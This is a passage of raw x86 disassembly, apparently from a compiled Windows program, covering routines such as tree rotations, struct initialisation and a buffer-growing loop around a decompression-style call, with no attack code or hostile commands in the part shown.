   19e4a:	lea    eax,[esi+0x1]
   19e4d:	movzx  edx,BYTE PTR [eax]
   19e50:	push   eax
   19e51:	inc    edi
   19e52:	lea    edx,[edx*8+0x7ad68]
   19e59:	push   edi
   19e5a:	push   edx
   19e5b:	mov    ecx,ebx
   19e5d:	call   DWORD PTR [edx+0x4]
   19e60:	pop    edi
   19e61:	pop    esi
   19e62:	pop    ebx
   19e63:	pop    ebp
   19e64:	ret    0xc
   19e67:	int3   
   19e68:	int3   
   19e69:	int3   
   19e6a:	int3   
   19e6b:	int3   
   19e6c:	mov    edi,edi
   19e6e:	push   ebp
   19e6f:	mov    ebp,esp
   19e71:	mov    DWORD PTR [ecx],0x1
   19e77:	pop    ebp
   19e78:	jmp    0x19df4
   19e7d:	int3   
   19e7e:	int3   
   19e7f:	int3   
   19e80:	int3   
   19e81:	int3   
   19e82:	mov    edi,edi
   19e84:	push   ebp
   19e85:	mov    ebp,esp
   19e87:	mov    DWORD PTR [ecx+0x4],0x1
   19e8e:	pop    ebp
   19e8f:	jmp    0x19df4
   19e94:	int3   
   19e95:	int3   
   19e96:	int3   
   19e97:	int3   
   19e98:	int3   
   19e99:	int3   
   19e9a:	mov    edi,edi
   19e9c:	push   ebp
   19e9d:	mov    ebp,esp
   19e9f:	mov    eax,DWORD PTR [ebp+0x10]
   19ea2:	sub    esp,0x10
   19ea5:	test   BYTE PTR [eax+0x1],0x38
   19ea9:	push   eax
   19eaa:	push   DWORD PTR [ebp+0xc]
   19ead:	jne    0x19ec2
   19eaf:	mov    DWORD PTR [ebp-0x8],0x5bf6
   19eb6:	mov    DWORD PTR [ebp-0x4],0x19d1a
   19ebd:	lea    eax,[ebp-0x8]
   19ec0:	jmp    0x19ed3
   19ec2:	mov    DWORD PTR [ebp-0x10],0x52f6
   19ec9:	mov    DWORD PTR [ebp-0xc],0x19d1a
   19ed0:	lea    eax,[ebp-0x10]
   19ed3:	push   eax
   19ed4:	call   0x19d1a
   19ed9:	leave  
   19eda:	ret    0xc
   19edd:	int3   
   19ede:	int3   
   19edf:	int3   
   19ee0:	int3   
   19ee1:	int3   
   19ee2:	mov    edi,edi
   19ee4:	push   ebp
   19ee5:	mov    ebp,esp
   19ee7:	mov    eax,DWORD PTR [ebp+0x10]
   19eea:	sub    esp,0x10
   19eed:	test   BYTE PTR [eax+0x1],0x38
   19ef1:	push   eax
   19ef2:	push   DWORD PTR [ebp+0xc]
   19ef5:	jne    0x19f0a
   19ef7:	mov    DWORD PTR [ebp-0x8],0x66f7
   19efe:	mov    DWORD PTR [ebp-0x4],0x19d1a
   19f05:	lea    eax,[ebp-0x8]
   19f08:	jmp    0x19f1b
   19f0a:	mov    DWORD PTR [ebp-0x10],0x52f7
   19f11:	mov    DWORD PTR [ebp-0xc],0x19d1a
   19f18:	lea    eax,[ebp-0x10]
   19f1b:	push   eax
   19f1c:	call   0x19d1a
   19f21:	leave  
   19f22:	ret    0xc
   19f25:	int3   
   19f26:	int3   
   19f27:	int3   
   19f28:	int3   
   19f29:	int3   
   19f2a:	mov    edi,edi
   19f2c:	push   ebp
   19f2d:	mov    ebp,esp
   19f2f:	push   ecx
   19f30:	push   ecx
   19f31:	mov    edx,DWORD PTR [ebp+0x10]
   19f34:	mov    al,BYTE PTR [edx+0x1]
   19f37:	cmp    al,0x15
   19f39:	je     0x19f59
   19f3b:	cmp    al,0x25
   19f3d:	je     0x19f59
   19f3f:	and    al,0x38
   19f41:	cmp    al,0x10
   19f43:	je     0x19f51
   19f45:	cmp    al,0x18
   19f47:	je     0x19f51
   19f49:	cmp    al,0x20
   19f4b:	je     0x19f51
   19f4d:	cmp    al,0x28
   19f4f:	jne    0x19f65
   19f51:	mov    eax,DWORD PTR [ecx+0x8]
   19f54:	or     DWORD PTR [eax],0xffffffff
   19f57:	jmp    0x19f65
   19f59:	mov    eax,DWORD PTR [edx+0x2]
   19f5c:	mov    eax,DWORD PTR [eax]
   19f5e:	push   esi
   19f5f:	mov    esi,DWORD PTR [ecx+0x8]
   19f62:	mov    DWORD PTR [esi],eax
   19f64:	pop    esi
   19f65:	push   edx
   19f66:	push   DWORD PTR [ebp+0xc]
   19f69:	lea    eax,[ebp-0x8]
   19f6c:	push   eax
   19f6d:	mov    DWORD PTR [ebp-0x8],0x52ff
   19f74:	mov    DWORD PTR [ebp-0x4],0x19d1a
   19f7b:	call   0x19d1a
   19f80:	leave  
   19f81:	ret    0xc
   19f84:	int3   
   19f85:	int3   
   19f86:	int3   
   19f87:	int3   
   19f88:	int3   
   19f89:	int3   
   19f8a:	mov    edi,edi
   19f8c:	push   ebp
   19f8d:	mov    ebp,esp
   19f8f:	sub    esp,0x5c
   19f92:	mov    eax,ds:0x7e528
   19f97:	xor    eax,ebp
   19f99:	mov    DWORD PTR [ebp-0x4],eax
   19f9c:	mov    eax,DWORD PTR [ebp+0x10]
   19f9f:	push   esi
   19fa0:	mov    esi,DWORD PTR [ebp+0x8]
   19fa3:	push   edi
   19fa4:	mov    edi,DWORD PTR [ebp+0xc]
   19fa7:	push   0x0
   19fa9:	push   eax
   19faa:	lea    ecx,[ebp-0x5c]
   19fad:	call   0x19ce0
   19fb2:	push   edi
   19fb3:	push   esi
   19fb4:	lea    ecx,[ebp-0x5c]
   19fb7:	call   0x19c22
   19fbc:	mov    ecx,DWORD PTR [ebp-0x4]
   19fbf:	pop    edi
   19fc0:	xor    ecx,ebp
   19fc2:	pop    esi
   19fc3:	call   0x1da15
   19fc8:	leave  
   19fc9:	ret    0xc
   19fcc:	int3   
   19fcd:	int3   
   19fce:	int3   
   19fcf:	int3   
   19fd0:	int3   
   19fd1:	int3   
   19fd2:	mov    edi,edi
   19fd4:	push   ebp
   19fd5:	mov    ebp,esp
   19fd7:	push   esi
   19fd8:	mov    esi,DWORD PTR [ebp+0x8]
   19fdb:	push   edi
   19fdc:	mov    edi,ecx
   19fde:	cmp    edi,esi
   19fe0:	je     0x1a00d
   19fe2:	mov    eax,DWORD PTR [edi+0x4]
   19fe5:	cmp    eax,DWORD PTR [esi+0x4]
   19fe8:	je     0x19ffc
   19fea:	cmp    BYTE PTR [edi],0x0
   19fed:	je     0x19ff6
   19fef:	push   eax
   19ff0:	call   0x1d9f8
   19ff5:	pop    ecx
   19ff6:	mov    al,BYTE PTR [esi]
   19ff8:	mov    BYTE PTR [edi],al
   19ffa:	jmp    0x1a004
   19ffc:	cmp    BYTE PTR [esi],0x0
   19fff:	je     0x1a004
   1a001:	mov    BYTE PTR [edi],0x1
   1a004:	mov    eax,DWORD PTR [esi+0x4]
   1a007:	mov    BYTE PTR [esi],0x0
   1a00a:	mov    DWORD PTR [edi+0x4],eax
   1a00d:	mov    eax,edi
   1a00f:	pop    edi
   1a010:	pop    esi
   1a011:	pop    ebp
   1a012:	ret    0x4
   1a015:	int3   
   1a016:	int3   
   1a017:	int3   
   1a018:	int3   
   1a019:	int3   
   1a01a:	mov    edi,edi
   1a01c:	push   ebp
   1a01d:	mov    ebp,esp
   1a01f:	sub    esp,0x50
   1a022:	push   ebx
   1a023:	push   esi
   1a024:	push   edi
   1a025:	mov    edi,0x4000
   1a02a:	push   edi
   1a02b:	call   0x10a52
   1a030:	pop    ecx
   1a031:	xor    ebx,ebx
   1a033:	push   0x38
   1a035:	push   0x1ebf8
   1a03a:	cmp    eax,ebx
   1a03c:	mov    DWORD PTR [ebp-0x4],eax
   1a03f:	mov    DWORD PTR [ebp-0xc],eax
   1a042:	push   0x2f
   1a044:	lea    eax,[ebp-0x50]
   1a047:	setne  BYTE PTR [ebp-0x10]
   1a04b:	push   eax
   1a04c:	xor    esi,esi
   1a04e:	mov    DWORD PTR [ebp-0x30],ebx
   1a051:	mov    DWORD PTR [ebp-0x2c],ebx
   1a054:	mov    DWORD PTR [ebp-0x28],ebx
   1a057:	mov    DWORD PTR [ebp-0x4c],ebx
   1a05a:	mov    DWORD PTR [ebp-0x50],ebx
   1a05d:	call   0x1b8ec
   1a062:	test   eax,eax
   1a064:	je     0x1a083
   1a066:	mov    esi,DWORD PTR [ebp+0x8]
   1a069:	mov    BYTE PTR [esi],bl
   1a06b:	mov    DWORD PTR [esi+0x4],ebx
   1a06e:	cmp    BYTE PTR [ebp-0x10],bl
   1a071:	je     0x1a07c
   1a073:	push   DWORD PTR [ebp-0x4]
   1a076:	call   0x1d9f8
   1a07b:	pop    ecx
   1a07c:	mov    eax,esi
   1a07e:	jmp    0x1a198
   1a083:	mov    eax,DWORD PTR [ebp+0x10]
   1a086:	mov    DWORD PTR [ebp-0x4c],eax
   1a089:	mov    eax,DWORD PTR [ebp+0xc]
   1a08c:	mov    DWORD PTR [ebp-0x50],eax
   1a08f:	mov    eax,DWORD PTR [ebp-0xc]
   1a092:	add    eax,esi
   1a094:	mov    DWORD PTR [ebp-0x44],eax
   1a097:	push   0x4
   1a099:	lea    eax,[ebp-0x50]
   1a09c:	push   eax
   1a09d:	mov    DWORD PTR [ebp-0x40],edi
   1a0a0:	call   0x1ba80
   1a0a5:	cmp    eax,0xfffffffc
   1a0a8:	mov    DWORD PTR [ebp+0x10],eax
   1a0ab:	jl     0x1a0bf
   1a0ad:	cmp    eax,0xfffffffd
   1a0b0:	jle    0x1a148
   1a0b6:	cmp    eax,0x2
   1a0b9:	je     0x1a148
   1a0bf:	mov    eax,edi
   1a0c1:	sub    eax,DWORD PTR [ebp-0x40]
   1a0c4:	add    esi,eax
   1a0c6:	cmp    DWORD PTR [ebp-0x40],ebx
   1a0c9:	jne    0x1a132
   1a0cb:	mov    al,BYTE PTR [ebp-0x10]
   1a0ce:	mov    BYTE PTR [ebp-0x18],al
   1a0d1:	mov    eax,DWORD PTR [ebp-0xc]
   1a0d4:	mov    DWORD PTR [ebp-0x14],eax
   1a0d7:	lea    eax,[esi+0x4000]
   1a0dd:	push   eax
   1a0de:	mov    BYTE PTR [ebp-0x10],bl
   1a0e1:	call   0x10a52
   1a0e6:	pop    ecx
   1a0e7:	cmp    eax,ebx
   1a0e9:	setne  cl
   1a0ec:	mov    DWORD PTR [ebp-0x4],eax
   1a0ef:	lea    eax,[ebp-0x8]
   1a0f2:	mov    BYTE PTR [ebp-0x8],cl
   1a0f5:	push   eax
   1a0f6:	lea    ecx,[ebp-0x10]
   1a0f9:	call   0x19fd2
   1a0fe:	cmp    BYTE PTR [ebp-0x8],bl
   1a101:	je     0x1a10c
   1a103:	push   DWORD PTR [ebp-0x4]
   1a106:	call   0x1d9f8
   1a10b:	pop    ecx
   1a10c:	push   esi
   1a10d:	push   DWORD PTR [ebp-0x14]
   1a110:	push   DWORD PTR [ebp-0xc]
   1a113:	call   0x1da7a
   1a118:	add    esp,0xc
   1a11b:	cmp    BYTE PTR [ebp-0x18],bl
   1a11e:	je     0x1a129
   1a120:	push   DWORD PTR [ebp-0x14]
   1a123:	call   0x1d9f8
   1a128:	pop    ecx
   1a129:	cmp    DWORD PTR [ebp-0x40],ebx
   1a12c:	je     0x1a08f
   1a132:	lea    eax,[ebp-0x50]
   1a135:	push   eax
   1a136:	call   0x1cc9e
   1a13b:	cmp    DWORD PTR [ebp+0x10],0x1
   1a13f:	jne    0x1a16a
   1a141:	mov    eax,DWORD PTR [ebp+0x14]
   1a144:	mov    DWORD PTR [eax],esi
   1a146:	jmp    0x1a18a
   1a148:	lea    eax,[ebp-0x50]
   1a14b:	push   eax
   1a14c:	call   0x1cc9e
   1a151:	mov    esi,DWORD PTR [ebp+0x8]
   1a154:	mov    BYTE PTR [esi],bl
   1a156:	mov    DWORD PTR [esi+0x4],ebx
   1a159:	cmp    BYTE PTR [ebp-0x10],bl
   1a15c:	je     0x1a07c
   1a162:	push   DWORD PTR [ebp-0xc]
   1a165:	jmp    0x1a076
   1a16a:	lea    eax,[ebp-0x18]
   1a16d:	push   eax
   1a16e:	lea    ecx,[ebp-0x10]
   1a171:	mov    BYTE PTR [ebp-0x18],bl
   1a174:	mov    DWORD PTR [ebp-0x14],ebx
   1a177:	call   0x19fd2
   1a17c:	cmp    BYTE PTR [ebp-0x18],bl
   1a17f:	je     0x1a18a
   1a181:	push   DWORD PTR [ebp-0x14]
   1a184:	call   0x1d9f8
   1a189:	pop    ecx
   1a18a:	mov    eax,DWORD PTR [ebp+0x8]
   1a18d:	mov    cl,BYTE PTR [ebp-0x10]
   1a190:	mov    BYTE PTR [eax],cl
   1a192:	mov    ecx,DWORD PTR [ebp-0xc]
   1a195:	mov    DWORD PTR [eax+0x4],ecx
   1a198:	pop    edi
   1a199:	pop    esi
   1a19a:	pop    ebx
   1a19b:	leave  
   1a19c:	ret    0x10
   1a19f:	int3   
   1a1a0:	int3   
   1a1a1:	int3   
   1a1a2:	int3   
   1a1a3:	int3   
   1a1a4:	xor    eax,eax
   1a1a6:	push   eax
   1a1a7:	push   eax
   1a1a8:	push   eax
   1a1a9:	push   eax
   1a1aa:	push   0x7fa30
   1a1af:	call   DWORD PTR ds:0x1ee28
   1a1b5:	test   eax,eax
   1a1b7:	setge  al
   1a1ba:	ret    
   1a1bb:	int3   
   1a1bc:	int3   
   1a1bd:	int3   
   1a1be:	int3   
   1a1bf:	int3   
   1a1c0:	push   0x0
   1a1c2:	push   0x7fa30
   1a1c7:	call   DWORD PTR ds:0x1ee24
   1a1cd:	ret    
   1a1ce:	int3   
   1a1cf:	int3   
   1a1d0:	int3   
   1a1d1:	int3   
   1a1d2:	int3   
   1a1d3:	int3   
   1a1d4:	mov    edi,edi
   1a1d6:	push   esi
   1a1d7:	push   edi
   1a1d8:	push   0x1
   1a1da:	xor    edi,edi
   1a1dc:	push   edi
   1a1dd:	mov    esi,ecx
   1a1df:	call   0x139ca
   1a1e4:	cmp    DWORD PTR ds:0x7f8d4,edi
   1a1ea:	jne    0x1a201
   1a1ec:	mov    ecx,eax
   1a1ee:	mov    DWORD PTR ds:0x7f8d4,ecx
   1a1f4:	mov    DWORD PTR [ecx],edi
   1a1f6:	mov    ecx,DWORD PTR ds:0x7f8d4
   1a1fc:	xor    eax,eax
   1a1fe:	mov    DWORD PTR [ecx+0x8],edi
   1a201:	inc    DWORD PTR ds:0x7fa58
   1a207:	cmp    eax,edi
   1a209:	je     0x1a212
   1a20b:	push   eax
   1a20c:	call   0x1d9f8
   1a211:	pop    ecx
   1a212:	push   edi
   1a213:	push   DWORD PTR ds:0x7f8d4
   1a219:	mov    ecx,esi
   1a21b:	call   0x139ca
   1a220:	mov    DWORD PTR [esi+0xc],edi
   1a223:	mov    DWORD PTR [esi+0x4],eax
   1a226:	mov    DWORD PTR [eax],eax
   1a228:	mov    esi,DWORD PTR [esi+0x4]
   1a22b:	pop    edi
   1a22c:	mov    DWORD PTR [esi+0x8],esi
   1a22f:	pop    esi
   1a230:	ret    
   1a231:	int3   
   1a232:	int3   
   1a233:	int3   
   1a234:	int3   
   1a235:	int3   
   1a236:	mov    edi,edi
   1a238:	push   ebx
   1a239:	push   esi
   1a23a:	xor    ebx,ebx
   1a23c:	push   ebx
   1a23d:	push   0x7fa30
   1a242:	call   0x11c02
   1a247:	call   eax
   1a249:	push   0x10
   1a24b:	call   0x10a52
   1a250:	mov    esi,eax
   1a252:	pop    ecx
   1a253:	cmp    esi,ebx
   1a255:	je     0x1a269
   1a257:	mov    ecx,esi
   1a259:	mov    BYTE PTR [esi+0x8],bl
   1a25c:	call   0x1a1d4
   1a261:	mov    DWORD PTR ds:0x7fa50,esi
   1a267:	jmp    0x1a26f
   1a269:	mov    DWORD PTR ds:0x7fa50,ebx
   1a26f:	push   0x10
   1a271:	call   0x10a52
   1a276:	mov    esi,eax
   1a278:	pop    ecx
   1a279:	cmp    esi,ebx
   1a27b:	je     0x1a28f
   1a27d:	mov    ecx,esi
   1a27f:	mov    BYTE PTR [esi+0x8],bl
   1a282:	call   0x140da
   1a287:	mov    DWORD PTR ds:0x7fa54,esi
   1a28d:	jmp    0x1a295
   1a28f:	mov    DWORD PTR ds:0x7fa54,ebx
   1a295:	pop    esi
   1a296:	pop    ebx
   1a297:	ret    
   1a298:	int3   
   1a299:	int3   
   1a29a:	int3   
   1a29b:	int3   
   1a29c:	int3   
   1a29d:	int3   
   1a29e:	mov    edi,edi
   1a2a0:	push   ebp
   1a2a1:	mov    ebp,esp
   1a2a3:	mov    eax,ecx
   1a2a5:	mov    ecx,DWORD PTR [ebp+0xc]
   1a2a8:	mov    edx,DWORD PTR [ecx]
   1a2aa:	mov    DWORD PTR [eax],edx
   1a2ac:	mov    edx,DWORD PTR [ecx]
   1a2ae:	add    edx,0x1000
   1a2b4:	mov    DWORD PTR [eax+0x4],edx
   1a2b7:	mov    edx,DWORD PTR [ebp+0x8]
   1a2ba:	mov    DWORD PTR [eax+0x8],edx
   1a2bd:	mov    DWORD PTR [eax+0xc],ecx
   1a2c0:	pop    ebp
   1a2c1:	ret    0x8
   1a2c4:	int3   
   1a2c5:	int3   
   1a2c6:	int3   
   1a2c7:	int3   
   1a2c8:	int3   
   1a2c9:	int3   
   1a2ca:	mov    edi,edi
   1a2cc:	push   ebp
   1a2cd:	mov    ebp,esp
   1a2cf:	mov    eax,DWORD PTR [ebp+0x8]
   1a2d2:	mov    edx,DWORD PTR ds:0x7fa8c
   1a2d8:	jmp    0x1a2dc
   1a2da:	mov    eax,ecx
   1a2dc:	mov    ecx,DWORD PTR [eax+0x8]
   1a2df:	cmp    ecx,edx
   1a2e1:	jne    0x1a2da
   1a2e3:	pop    ebp
   1a2e4:	ret    0x4
   1a2e7:	int3   
   1a2e8:	int3   
   1a2e9:	int3   
   1a2ea:	int3   
   1a2eb:	int3   
   1a2ec:	mov    edi,edi
   1a2ee:	push   ebp
   1a2ef:	mov    ebp,esp
   1a2f1:	mov    eax,DWORD PTR [ebp+0x8]
   1a2f4:	mov    edx,DWORD PTR ds:0x7fa8c
   1a2fa:	jmp    0x1a2fe
   1a2fc:	mov    eax,ecx
   1a2fe:	mov    ecx,DWORD PTR [eax]
   1a300:	cmp    ecx,edx
   1a302:	jne    0x1a2fc
   1a304:	pop    ebp
   1a305:	ret    0x4
   1a308:	int3   
   1a309:	int3   
   1a30a:	int3   
   1a30b:	int3   
   1a30c:	int3   
   1a30d:	int3   
   1a30e:	mov    edi,edi
   1a310:	push   esi
   1a311:	mov    esi,ecx
   1a313:	mov    ecx,DWORD PTR [esi]
   1a315:	mov    eax,DWORD PTR [ecx+0x8]
   1a318:	cmp    eax,DWORD PTR ds:0x7fa8c
   1a31e:	je     0x1a32c
   1a320:	push   eax
   1a321:	call   0x1a2ec
   1a326:	jmp    0x1a33b
   1a328:	mov    DWORD PTR [esi],eax
   1a32a:	mov    ecx,eax
   1a32c:	mov    eax,DWORD PTR [ecx+0x4]
   1a32f:	cmp    ecx,DWORD PTR [eax+0x8]
   1a332:	je     0x1a328
   1a334:	mov    ecx,DWORD PTR [esi]
   1a336:	cmp    DWORD PTR [ecx+0x8],eax
   1a339:	je     0x1a33d
   1a33b:	mov    DWORD PTR [esi],eax
   1a33d:	pop    esi
   1a33e:	ret    
   1a33f:	int3   
   1a340:	int3   
   1a341:	int3   
   1a342:	int3   
   1a343:	int3   
   1a344:	mov    edi,edi
   1a346:	push   ebp
   1a347:	mov    ebp,esp
   1a349:	mov    eax,DWORD PTR [ebp+0x8]
   1a34c:	test   eax,eax
   1a34e:	je     0x1a357
   1a350:	mov    ecx,DWORD PTR [ebp+0xc]
   1a353:	mov    ecx,DWORD PTR [ecx]
   1a355:	mov    DWORD PTR [eax],ecx
   1a357:	pop    ebp
   1a358:	ret    0x8
   1a35b:	int3   
   1a35c:	int3   
   1a35d:	int3   
   1a35e:	int3   
   1a35f:	int3   
   1a360:	mov    edi,edi
   1a362:	push   ebp
   1a363:	mov    ebp,esp
   1a365:	mov    eax,DWORD PTR [ebp+0x8]
   1a368:	jmp    0x1a378
   1a36a:	mov    ecx,DWORD PTR [eax]
   1a36c:	mov    edx,DWORD PTR [ebp+0x10]
   1a36f:	add    DWORD PTR [ebp+0x10],0x4
   1a373:	mov    DWORD PTR [edx],ecx
   1a375:	add    eax,0x4
   1a378:	cmp    eax,DWORD PTR [ebp+0xc]
   1a37b:	jne    0x1a36a
   1a37d:	mov    eax,DWORD PTR [ebp+0x10]
   1a380:	pop    ebp
   1a381:	ret    0xc
   1a384:	int3   
   1a385:	int3   
   1a386:	int3   
   1a387:	int3   
   1a388:	int3   
   1a389:	int3   
   1a38a:	mov    edi,edi
   1a38c:	push   ebp
   1a38d:	mov    ebp,esp
   1a38f:	mov    eax,DWORD PTR [ebp+0x8]
   1a392:	test   eax,eax
   1a394:	jge    0x1a398
   1a396:	xor    eax,eax
   1a398:	shl    eax,0x2
   1a39b:	push   eax
   1a39c:	call   0x10a52
   1a3a1:	pop    ecx
   1a3a2:	pop    ebp
   1a3a3:	ret    0x8
   1a3a6:	int3   
   1a3a7:	int3   
   1a3a8:	int3   
   1a3a9:	int3   
   1a3aa:	int3   
   1a3ab:	int3   
   1a3ac:	mov    edi,edi
   1a3ae:	push   ebp
   1a3af:	mov    ebp,esp
   1a3b1:	push   esi
   1a3b2:	mov    esi,ecx
   1a3b4:	push   DWORD PTR [esi]
   1a3b6:	call   0x1d9f8
   1a3bb:	test   BYTE PTR [ebp+0x8],0x1
   1a3bf:	pop    ecx
   1a3c0:	je     0x1a3c9
   1a3c2:	push   esi
   1a3c3:	call   0x1d9f8
   1a3c8:	pop    ecx
   1a3c9:	mov    eax,esi
   1a3cb:	pop    esi
   1a3cc:	pop    ebp
   1a3cd:	ret    0x4
   1a3d0:	int3   
   1a3d1:	int3   
   1a3d2:	int3   
   1a3d3:	int3   
   1a3d4:	int3   
   1a3d5:	int3   
   1a3d6:	mov    eax,ecx
   1a3d8:	add    DWORD PTR [eax+0x8],0x4
   1a3dc:	mov    ecx,DWORD PTR [eax+0x8]
   1a3df:	cmp    ecx,DWORD PTR [eax+0x4]
   1a3e2:	jne    0x1a3fd
   1a3e4:	add    DWORD PTR [eax+0xc],0x4
   1a3e8:	mov    ecx,DWORD PTR [eax+0xc]
   1a3eb:	mov    ecx,DWORD PTR [ecx]
   1a3ed:	mov    DWORD PTR [eax],ecx
   1a3ef:	add    ecx,0x1000
   1a3f5:	mov    DWORD PTR [eax+0x4],ecx
   1a3f8:	mov    ecx,DWORD PTR [eax]
   1a3fa:	mov    DWORD PTR [eax+0x8],ecx
   1a3fd:	ret    
   1a3fe:	int3   
   1a3ff:	int3   
   1a400:	int3   
   1a401:	int3   
   1a402:	int3   
   1a403:	int3   
   1a404:	mov    edi,edi
   1a406:	push   ebp
   1a407:	mov    ebp,esp
   1a409:	mov    eax,ds:0x7fa84
   1a40e:	sub    esp,0x20
   1a411:	push   ebx
   1a412:	push   esi
   1a413:	push   edi
   1a414:	lea    esi,[eax+0x4]
   1a417:	lea    edi,[ebp-0x10]
   1a41a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a41b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a41c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a41e:	lea    ebx,[eax+0x14]
   1a421:	jmp    0x1a43f
   1a423:	mov    eax,DWORD PTR [eax]
   1a425:	mov    ecx,DWORD PTR [eax+0x8]
   1a428:	cmp    ecx,DWORD PTR [ebp+0x8]
   1a42b:	jne    0x1a437
   1a42d:	cmp    BYTE PTR [eax+0x24],0x0
   1a431:	jne    0x1a450
   1a433:	mov    BYTE PTR [eax+0x24],0x1
   1a437:	lea    ecx,[ebp-0x10]
   1a43a:	call   0x1a3d6
   1a43f:	mov    eax,DWORD PTR [ebp-0x8]
   1a442:	lea    edi,[ebp-0x20]
   1a445:	mov    esi,ebx
   1a447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a44a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a44b:	cmp    eax,DWORD PTR [ebp-0x18]
   1a44e:	jne    0x1a423
   1a450:	pop    edi
   1a451:	pop    esi
   1a452:	pop    ebx
   1a453:	leave  
   1a454:	ret    0x4
   1a457:	int3   
   1a458:	int3   
   1a459:	int3   
   1a45a:	int3   
   1a45b:	int3   
   1a45c:	mov    eax,ecx
   1a45e:	xor    ecx,ecx
   1a460:	mov    DWORD PTR [eax+0x4],ecx
   1a463:	mov    DWORD PTR [eax+0x8],ecx
   1a466:	mov    DWORD PTR [eax+0xc],ecx
   1a469:	mov    DWORD PTR [eax+0x10],ecx
   1a46c:	mov    DWORD PTR [eax+0x14],ecx
   1a46f:	mov    DWORD PTR [eax+0x18],ecx
   1a472:	mov    DWORD PTR [eax+0x1c],ecx
   1a475:	mov    DWORD PTR [eax+0x20],ecx
   1a478:	mov    DWORD PTR [eax+0x24],ecx
   1a47b:	mov    DWORD PTR [eax+0x28],ecx
   1a47e:	mov    DWORD PTR [eax+0x2c],ecx
   1a481:	ret    0x4
   1a484:	int3   
   1a485:	int3   
   1a486:	int3   
   1a487:	int3   
   1a488:	int3   
   1a489:	int3   
   1a48a:	mov    edi,edi
   1a48c:	push   ebp
   1a48d:	mov    ebp,esp
   1a48f:	sub    esp,0x10
   1a492:	push   esi
   1a493:	push   edi
   1a494:	lea    esi,[ecx+0x4]
   1a497:	lea    edi,[ebp-0x10]
   1a49a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a49b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a49c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a49d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a49e:	mov    eax,DWORD PTR [ebp-0x8]
   1a4a1:	pop    edi
   1a4a2:	pop    esi
   1a4a3:	leave  
   1a4a4:	ret    
   1a4a5:	int3   
   1a4a6:	int3   
   1a4a7:	int3   
   1a4a8:	int3   
   1a4a9:	int3   
   1a4aa:	mov    edi,edi
   1a4ac:	push   ebp
   1a4ad:	mov    ebp,esp
   1a4af:	mov    edx,DWORD PTR [ebp+0x8]
   1a4b2:	mov    eax,DWORD PTR [edx+0x8]
   1a4b5:	push   esi
   1a4b6:	mov    esi,DWORD PTR [eax]
   1a4b8:	mov    DWORD PTR [edx+0x8],esi
   1a4bb:	mov    esi,DWORD PTR [eax]
   1a4bd:	cmp    esi,DWORD PTR ds:0x7fa8c
   1a4c3:	je     0x1a4c8
   1a4c5:	mov    DWORD PTR [esi+0x4],edx
   1a4c8:	mov    esi,DWORD PTR [edx+0x4]
   1a4cb:	mov    DWORD PTR [eax+0x4],esi
   1a4ce:	mov    ecx,DWORD PTR [ecx+0x4]
   1a4d1:	pop    esi
   1a4d2:	cmp    edx,DWORD PTR [ecx+0x4]
   1a4d5:	jne    0x1a4dc
   1a4d7:	mov    DWORD PTR [ecx+0x4],eax
   1a4da:	jmp    0x1a4ea
   1a4dc:	mov    ecx,DWORD PTR [edx+0x4]
   1a4df:	cmp    edx,DWORD PTR [ecx]
   1a4e1:	jne    0x1a4e7
   1a4e3:	mov    DWORD PTR [ecx],eax
   1a4e5:	jmp    0x1a4ea
   1a4e7:	mov    DWORD PTR [ecx+0x8],eax
   1a4ea:	mov    DWORD PTR [eax],edx
   1a4ec:	mov    DWORD PTR [edx+0x4],eax
   1a4ef:	pop    ebp
   1a4f0:	ret    0x4
   1a4f3:	int3   
   1a4f4:	int3   
   1a4f5:	int3   
   1a4f6:	int3   
   1a4f7:	int3   
   1a4f8:	mov    edi,edi
   1a4fa:	push   ebp
   1a4fb:	mov    ebp,esp
   1a4fd:	mov    edx,DWORD PTR [ebp+0x8]
   1a500:	mov    eax,DWORD PTR [edx]
   1a502:	push   esi
   1a503:	mov    esi,DWORD PTR [eax+0x8]
   1a506:	mov    DWORD PTR [edx],esi
   1a508:	mov    esi,DWORD PTR [eax+0x8]
   1a50b:	cmp    esi,DWORD PTR ds:0x7fa8c
   1a511:	je     0x1a516
   1a513:	mov    DWORD PTR [esi+0x4],edx
   1a516:	mov    esi,DWORD PTR [edx+0x4]
   1a519:	mov    DWORD PTR [eax+0x4],esi
   1a51c:	mov    ecx,DWORD PTR [ecx+0x4]
   1a51f:	pop    esi
   1a520:	cmp    edx,DWORD PTR [ecx+0x4]
   1a523:	jne    0x1a52a
   1a525:	mov    DWORD PTR [ecx+0x4],eax
   1a528:	jmp    0x1a539
   1a52a:	mov    ecx,DWORD PTR [edx+0x4]
   1a52d:	cmp    edx,DWORD PTR [ecx+0x8]
   1a530:	jne    0x1a537
   1a532:	mov    DWORD PTR [ecx+0x8],eax
   1a535:	jmp    0x1a539
   1a537:	mov    DWORD PTR [ecx],eax
   1a539:	mov    DWORD PTR [eax+0x8],edx
   1a53c:	mov    DWORD PTR [edx+0x4],eax
   1a53f:	pop    ebp
   1a540:	ret    0x4
   1a543:	int3   
   1a544:	int3   
   1a545:	int3   
   1a546:	int3   
   1a547:	int3   
   1a548:	mov    edi,edi
   1a54a:	push   esi
   1a54b:	mov    esi,ecx
   1a54d:	mov    ecx,DWORD PTR [esi]
   1a54f:	cmp    DWORD PTR [ecx+0x14],0x0
   1a553:	jne    0x1a562
   1a555:	mov    eax,DWORD PTR [ecx+0x4]
   1a558:	cmp    DWORD PTR [eax+0x4],ecx
   1a55b:	jne    0x1a562
   1a55d:	mov    eax,DWORD PTR [ecx+0x8]
   1a560:	jmp    0x1a57f
   1a562:	mov    eax,DWORD PTR [ecx]
   1a564:	cmp    eax,DWORD PTR ds:0x7fa8c
   1a56a:	je     0x1a578
   1a56c:	push   eax
   1a56d:	call   0x1a2ca
   1a572:	jmp    0x1a57f
   1a574:	mov    DWORD PTR [esi],eax
